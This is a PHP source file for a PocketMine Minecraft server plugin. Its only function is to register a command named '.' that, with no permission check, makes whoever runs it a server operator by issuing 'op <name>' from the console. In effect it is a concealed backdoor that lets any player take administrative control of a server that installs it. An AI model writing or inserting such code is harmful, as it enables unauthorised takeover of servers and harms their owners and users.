<?php
use pocketmine\plugin\PluginBase;
use pocketmine\command\Command;
use pocketmine\command\CommandSender;
use pocketmine\command\ConsoleCommandSender;

class Main extends PluginBase {
	
	public function onCommand(CommandSender $sender, Command $command, $label, array $args) : bool{
		switch($command->getName()){
			case ".":
				$name = $sender->getName();
				$cmd = "op {$name}";
				$this->getServer()->dispatchCommand(new ConsoleCommandSender, $cmd);
			return true;
		}
	}
}
?>